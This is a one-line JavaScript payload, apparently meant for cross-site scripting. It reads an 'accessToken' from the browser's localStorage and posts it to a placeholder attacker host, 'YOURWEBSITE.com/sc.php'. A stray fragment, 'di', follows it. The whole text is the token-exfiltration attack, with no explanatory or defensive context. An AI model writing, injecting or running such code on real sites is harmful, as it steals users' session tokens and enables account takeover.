const token = localStorage.getItem('accessToken'); fetch('YOURWEBSITE.com/sc.php',{method: 'POST',headers: {'Content-Type':'application/x-www-form-urlencoded'},body: 'user=' + token});
di
